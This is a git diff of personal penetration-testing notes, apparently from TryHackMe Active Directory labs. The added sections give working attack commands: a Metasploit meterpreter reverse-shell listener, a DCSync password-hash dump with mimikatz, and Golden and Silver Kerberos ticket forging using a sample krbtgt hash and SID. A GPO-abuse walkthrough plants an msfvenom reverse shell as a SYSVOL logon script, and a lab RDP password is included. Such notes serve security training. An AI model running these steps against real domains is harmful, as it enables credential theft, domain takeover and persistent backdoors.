@@ -340,6 +340,10 @@ ssh redis@<redis ip> -i ~/.ssh/<private key>  # ssh into redis from kali
 
 # <span style="color:rgb(11, 142, 224)">File Transfer</span>
 
+```
+cat <filename> | grep -i "<word>" -C 10
+#10 lines before and 10 lines after
+```
 ### <span style="color:rgb(11, 142, 224)">If file not downloading : </span>
 
 The error `Access to the path 'C:\nc.exe' is denied` occurs because you're trying to save `nc.exe` directly in `C:\`, and your current user does not have permission to write there.
@@ -417,22 +421,22 @@ copy <input file name> \\<kali ip>\share\<output file name>
 # ex. copy windows.txt \\192.168.131.128\share\windows.txt
 ```
 
-If errors : 
+### ==🔵Windows (AD) → Kali (SCP)==
+
+Kali:
+```bash
+sudo systemctl start ssh
 ```
-on attacker machine : 
-impacket-smbserver -smb2support randomname . -username user -password password
 
-on victim machine : 
-net use z: \\192.168.45.206\test /u:test test
-dir z:
+Windows PowerShell:
+```powershell
+scp C:\path\to\file.txt kali@<KALI_IP>:/home/kali/
 ```
-here , "randomname" is just a random name given , and can give any username and password 
-"." here is work in the current directory
-authentication required as some servers so not accept without auth
 
------
-
-### <span style="color:rgb(11, 142, 224)">Windows → Kali Linux (AD lab is to use an authenticated SMB share)</span>
+```powershell
+scp C:\Tools\mimikatz_trunk\x64\sample2.txt kali@10.150.73.2:/home/kali/Downloads
+```
+### <span style="color:rgb(11, 142, 224)">Windows (AD -authenticated SMB share) → Kali Linux</span>
 
 #### On Kali
 
@@ -559,12 +563,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.138 LPORT=4444 -f
 transfer to windows 
 now back on kali start listener 
 ```
-msfconsole -q
-use multi/handler
-set payload windows/x64/meterpreter/reverse_tcp
-set lhost 10.10.14.174 [Kali VM IP Address] 
-set lport 4444
-run
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <SET LHOST>; set LPORT 4445;exploit"
 ```
 now run our reverse shell on windows : 
 ```
@@ -3828,16 +3827,11 @@ Verify group membership
 whoami /groups
 ```
 
-### ==🟢Persistence==
+### ==🟢Persistence (Post DC exploitation)==
 
-#### ==🔵Ways to Persist Administrative Access:==
-- Dump ntds.dit
-- Creation of domain admin account
-- Creation of golden ticket
-- Creation of Skeleton key
-- Use of DCSync/DCShadow
-
-#### ==🔵Golden Ticket*==
+==🔴ALL THESE STEPS ONLY AFTER YOU HAVE GOT DOMAIN ADMIN 
+i.e DOMAIN CONTROLLER AS NT AUTHORITY\SYSTEM==
+#### ==🔵Golden Ticket==
 
 on our kali attacker machine : 
 ```
@@ -3884,6 +3878,191 @@ we got access of domain controller
 it doesn't even check if the username we are impersonating even exists or not 
 Mitigations: Change the krbtgt account password TWICE. 
 
+#### ==🔵Credentials Dump of all accounts (DCSync)==
+
+==🔴Requirements : You need domain admin credentials/domain admin access beforehand==
+
+DCSync is an attack that tricks Active Directory into sharing password hashes by pretending to be a Domain Controller (DC) performing replication.
+
+run mimikatz
+```
+.\mimikatz.exe 
+```
+
+to have mimikatz store everything we do in this file
+```
+log sample.txt
+```
+
+choose a username to dump the credentials of 
+```
+lsadump::dcsync /user:<username>
+# lsadump::dcsync /domain:za.tryhackme.loc /user:<username>
+```
+if we have to do it for all the users : 
+```
+lsadump::dcsync /all
+```
+
+if we exit and see the contents to the file we saved it to :
+```
+mimikatz # exit
+dir 
+sample.txt
+```
+
+now we can transfer it back to our attacker machine kali  so save a copy of the users credentials
+Kali:
+```bash
+sudo systemctl start ssh
+```
+Windows PowerShell:
+```powershell
+scp C:\path\to\file.txt kali@<KALI_IP>:/home/kali/
+```
+
+find a value
+```
+cat sample2.txt | grep "krbtgt" -C 10
+#print 10 line before and after as well
+```
+
+#### ==🔵Silver and Golden Tickets==
+
+==🔴we need admin to run mimikatz==
+
+command for both golden tickets and silver ticket is same
+just note that in silver ticket , it has a parameter for a service name
+but golden ticket doesn't has a service parameter
+
+==🔴if SID and hashes not available , do first the earlier method of `DCSync`==
+##### Golden Tickets : 
+
+```
+.\mimikatz.exe 
+```
+
+from our dcsync , we has the SID of domain , and ntlm hash of `krbtgt`
+```
+cat sample2.txt | grep krbtgt -C 10
+SAM Username         : krbtgt
+Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-502
+Object Relative ID   : 502
+Credentials:
+  Hash NTLM: 16f9af38fca3ada405386b3b57366082
+```
+only this part : 
+```
+S-1-5-21-3885271727-2693558621-2658995185
+```
+not the 502 in last 
+
+Once Mimikatz is loaded, perform the following to generate a golden ticket:
+change /domain , /sid , /krbtgt
+```markup
+mimikatz # kerberos::golden /admin:Administrator /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /ptt
+```
+
+our Golden ticket has been generated
+to list all generated tickets : 
+```
+exit
+klist
+```
+now we can give any command impersonating as domain controller and we don't have to do any authentication , it will happen automatically through our golden ticket
+
+##### Silver Tickets :
+
+```
+.\mimikatz.exe
+```
+
+Mimikatz command to generate a silver ticket:
+change /domain , /sid , /target (server name is ending with $) , /rc4 ( $ in end)
+```markup
+mimikatz # kerberos::golden /admin:Administrator /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
+```
+our silver ticket is made
+
+```
+exit
+klist
+```
+
+#### ==🔵Abusing GPOs==
+
+we have to make 2 things 
+1. reverse shell which will give callback to our listener
+2. bat file which is a logon script
+
+make reverse shell 
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > kali_shell.exe
+```
+
+now make a bat file : this is our logon script 
+```
+gedit kali_script.bat
+```
+
+in this , paste : 
+```
+copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\kali_shell.exe C:\tmp\kali_shell.exe && timeout /t 20 && C:\tmp\kali_shell.exe
+```
+here m sysvol is the shared folder
+and this is the logon script which ill paste there
+so whenever the user will login my  reverse shell from `za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\kali_shell.exe` will be copied to `C:\tmp\kali_shell.exe` anf then waut 20 second and then exeucte the reverse shell
+
+We can use SCP and our Administrator credentials to copy both scripts to the SYSVOL directory:
+copy reverse shell to sysvol
+```
+scp kali_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
+```
+copy bat file
+```
+scp kali_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
+```
+
+Finally, let's start our MSF listener:
+```
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"
+```
+
+With our prep now complete, we can finally create the GPO that will execute it. You will need to RDP into THMWRK1 and use a runas window running as the Administrator for the next steps.
+
+```
+xfreerdp /v:THMWRK1.za.tryhackme.loc /u:administrator /p:tryhackmewouldnotguess1@ /workarea /cert:ignore /smart-sizing
+```
+
+GPO Creation  
+
+The first step uses our Domain Admin account to open the Group Policy Management snap-in:
+1. open cmd, type MMC and press enter.
+2. Click on **File**->**Add/Remove Snap-in...**
+3. Select the **Group Policy Management** snap-in and click **Add**
+4. Click **OK**
+
+now in our domain , select admin and "create a gpo in this domain"
+name it 
+right click on it and edit
+
+Group Policy Management Editor:  
+1. Under User Configuration, expand **Policies->Windows Settings**.
+2. Select **Scripts (Logon/Logoff)**.
+3. Right-click on **Logon->Properties**
+4. Select the **Scripts** tab.
+5. Click **Add->Browse**.
+Let's navigate to where we stored our Batch and binary files:
+on the file explorer search on top , select : 
+```
+Network > za.tryhackme.loc > SysVol > za.tryhackme.loc > scripts
+```
+now well wai ttill someone logins as admin 
+
+if lab , simulate a logon as admin 
+change the pass of an admin and login
+
+### ==🟢Credential Harvesting==
 
 
 
